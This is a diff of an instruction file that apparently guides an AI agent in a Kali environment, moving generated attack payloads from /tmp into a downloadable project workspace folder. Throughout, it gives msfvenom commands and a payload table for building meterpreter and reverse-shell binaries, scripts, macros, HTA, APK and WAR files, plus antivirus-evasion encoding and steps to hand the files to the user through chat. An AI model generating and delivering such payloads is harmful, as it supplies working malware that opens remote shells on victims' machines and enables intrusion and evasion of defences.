@@ -79,40 +79,44 @@ Run the handler with `-j` (background job) so it waits while you prepare and del
 Generate a payload binary/script using msfvenom:
 
 ```
-kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /tmp/<output_filename>"
+kali_shell: "msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -f <format> -o /workspace/<projectId>/notes/<output_filename>"
 ```
+
+`/workspace/<projectId>/` is your project workspace root (the exact path is under "Workspace Layout").
+Write every file the user will download under its `notes/`: the chat shows a download card only for a
+file of this project's workspace, never for one under `/tmp`.
 
 **Payload + Format Selection Matrix** (STAGELESS — works through any tunnel):
 
 **CRITICAL: CHECK "Pre-Configured Payload Settings" ABOVE. If ngrok or chisel is active, use the stageless payloads below. Staged variants FAIL through tunnels — sessions die in a loop.**
 
-| Target OS | Payload (stageless) | Format (`-f`) | Output File | Notes |
+| Target OS | Payload (stageless) | Format (`-f`) | Output File (under the workspace root) | Notes |
 |-----------|---------------------|---------------|-------------|-------|
-| Windows | `windows/meterpreter_reverse_tcp` | `exe` | `/tmp/payload.exe` | Most common |
-| Windows | `windows/meterpreter_reverse_https` | `exe` | `/tmp/payload.exe` | Encrypted, firewall bypass |
-| Windows | `windows/shell_reverse_tcp` | `exe` | `/tmp/shell.exe` | Shell fallback |
-| Windows | `windows/meterpreter_reverse_tcp` | `psh` / `psh-reflection` | `/tmp/payload.ps1` | PowerShell (fileless / AV evasion) |
-| Windows | `windows/meterpreter_reverse_tcp` | `vba` | `/tmp/payload.vba` | VBA macro (Office) |
-| Windows | `windows/meterpreter_reverse_tcp` | `hta-psh` | `/tmp/payload.hta` | HTA wrapping PS |
-| Linux | `linux/x64/meterpreter_reverse_tcp` | `elf` | `/tmp/payload.elf` | Standard Linux |
-| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `/tmp/shell.elf` | Shell fallback |
-| Linux | `cmd/unix/reverse_bash` | `raw` | `/tmp/payload.sh` | Bash one-liner |
-| Linux | `cmd/unix/reverse_python` | `raw` | `/tmp/payload.py` | Python one-liner |
-| macOS | `osx/x64/meterpreter_reverse_tcp` | `macho` | `/tmp/payload.macho` | Mach-O |
-| Android | `android/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.apk` | APK |
-| Java/Web | `java/meterpreter_reverse_tcp` | `war` | `/tmp/payload.war` | Tomcat/JBoss |
-| Multi | `python/meterpreter_reverse_tcp` | `raw` | `/tmp/payload.py` | Cross-platform |
+| Windows | `windows/meterpreter_reverse_tcp` | `exe` | `notes/payload.exe` | Most common |
+| Windows | `windows/meterpreter_reverse_https` | `exe` | `notes/payload.exe` | Encrypted, firewall bypass |
+| Windows | `windows/shell_reverse_tcp` | `exe` | `notes/shell.exe` | Shell fallback |
+| Windows | `windows/meterpreter_reverse_tcp` | `psh` / `psh-reflection` | `notes/payload.ps1` | PowerShell (fileless / AV evasion) |
+| Windows | `windows/meterpreter_reverse_tcp` | `vba` | `notes/payload.vba` | VBA macro (Office) |
+| Windows | `windows/meterpreter_reverse_tcp` | `hta-psh` | `notes/payload.hta` | HTA wrapping PS |
+| Linux | `linux/x64/meterpreter_reverse_tcp` | `elf` | `notes/payload.elf` | Standard Linux |
+| Linux | `linux/x64/shell_reverse_tcp` | `elf` | `notes/shell.elf` | Shell fallback |
+| Linux | `cmd/unix/reverse_bash` | `raw` | `notes/payload.sh` | Bash one-liner |
+| Linux | `cmd/unix/reverse_python` | `raw` | `notes/payload.py` | Python one-liner |
+| macOS | `osx/x64/meterpreter_reverse_tcp` | `macho` | `notes/payload.macho` | Mach-O |
+| Android | `android/meterpreter_reverse_tcp` | `raw` | `notes/payload.apk` | APK |
+| Java/Web | `java/meterpreter_reverse_tcp` | `war` | `notes/payload.war` | Tomcat/JBoss |
+| Multi | `python/meterpreter_reverse_tcp` | `raw` | `notes/payload.py` | Cross-platform |
 
 **Staged variant (direct connections only — NOT through tunnels):** replace the underscore with a slash to switch, e.g. `windows/meterpreter_reverse_tcp` → `windows/meterpreter/reverse_tcp`. The handler payload MUST EXACTLY MATCH the msfvenom payload — mixing staged/stageless = silent failure.
 
 **Encoding for AV evasion (optional):**
 ```
-msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o /tmp/payload_encoded.exe
+msfvenom -p <payload> LHOST=<LHOST> LPORT=<LPORT> -e x86/shikata_ga_nai -i 5 -f exe -o /workspace/<projectId>/notes/payload_encoded.exe
 ```
 
 **After generation:** Verify the file was created:
 ```
-kali_shell: "ls -la /tmp/payload.exe && hexdump -C /tmp/payload.exe | head -2"
+kali_shell: "ls -la /workspace/<projectId>/notes/payload.exe && hexdump -C /workspace/<projectId>/notes/payload.exe | head -2"
 ```
 
 ---
@@ -152,9 +156,9 @@ use exploit/windows/fileformat/lnk_shortcut_ftype_append; set PAYLOAD windows/me
 
 **CRITICAL: Fileformat module output location:**
 All fileformat modules save output to `~/.msf4/local/<FILENAME>` of the user running msfconsole
-(`/root/.msf4/local/` only when it runs as root). Resolve the real path before copying:
+(`/root/.msf4/local/` only when it runs as root). Copy it, by the FILENAME you set, into the workspace:
 ```
-kali_shell: "F=$(ls -t ~/.msf4/local/ | head -1); cp ~/.msf4/local/$F /tmp/ && ls -la /tmp/$F"
+kali_shell: "cp ~/.msf4/local/<FILENAME> /workspace/<projectId>/notes/<FILENAME> && ls -la /workspace/<projectId>/notes/<FILENAME>"
 ```
 
 ---
@@ -217,12 +221,12 @@ The target must visit this URL or open the `.hta` file for the payload to execut
 
 **For msfvenom payloads (Method A):**
 ```
-kali_shell: "ls -la /tmp/<filename> && hexdump -C /tmp/<filename> | head -2"
+kali_shell: "ls -la /workspace/<projectId>/notes/<filename> && hexdump -C /workspace/<projectId>/notes/<filename> | head -2"
 ```
 
 **For fileformat modules (Method B):**
 ```
-kali_shell: "ls -la /root/.msf4/local/ && cp /root/.msf4/local/<filename> /tmp/"
+kali_shell: "ls -la ~/.msf4/local/ && cp ~/.msf4/local/<filename> /workspace/<projectId>/notes/<filename>"
 ```
 
 **For web_delivery / HTA server (Method C & D):**
@@ -233,8 +237,8 @@ Note the URL or one-liner printed in the output.
 
 #### Chat Download (default)
 Report the file location and details to the user.
-The file will be available for download directly in the chat interface:
-- File path: `/tmp/<filename>`
+The file appears as a download card in the chat (only for a file of this project's workspace):
+- File path: `/workspace/<projectId>/notes/<filename>`
 - File size and type (from `ls -la` and the `hexdump` magic bytes)
 - Payload type and callback parameters (LHOST:LPORT)
 - Handler status (running in background)
